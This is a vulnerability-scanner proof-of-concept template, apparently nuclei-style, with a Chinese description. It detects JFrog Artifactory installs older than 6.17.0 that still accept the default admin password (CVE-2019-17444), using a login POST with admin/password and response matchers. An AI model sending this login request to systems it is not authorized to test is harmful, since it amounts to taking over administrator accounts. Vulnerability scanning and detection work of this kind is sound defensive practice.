[info]
author = "ave"
description = "检测 JFrog Artifactory 是否使用默认管理员密码 'password' 登录，验证默认口令漏洞"
id = "POC-AVE-2019-0123"
name = "JFrog Artifactory <6.17.0 Default Admin Password"
severity = "critical"
tags = ["ave-2019-0123"]
vuln_id = [
    "CVE-2019-17444",
    "AVE-2019-0123",
]

[poc]
logic = "all"

[[poc.requests]]
method = "POST"
path = "/ui/auth/login"
protocol = "http"

[poc.requests.body]
content = '{"user":"admin","password":"password","type":"login"}'
type = "json"

[poc.requests.headers]
Content-Type = "application/json;charset=UTF-8"
Origin = "{{RootURL}}"
X-Requested-With = "XMLHttpRequest"

[[poc.requests.matchers]]
expect = true
status = [200]
type = "status"

[[poc.requests.matchers]]
condition = "and"
expect = true
part = "body"
type = "word"
words = [
    '"name":"admin"',
    '"admin":true',
]
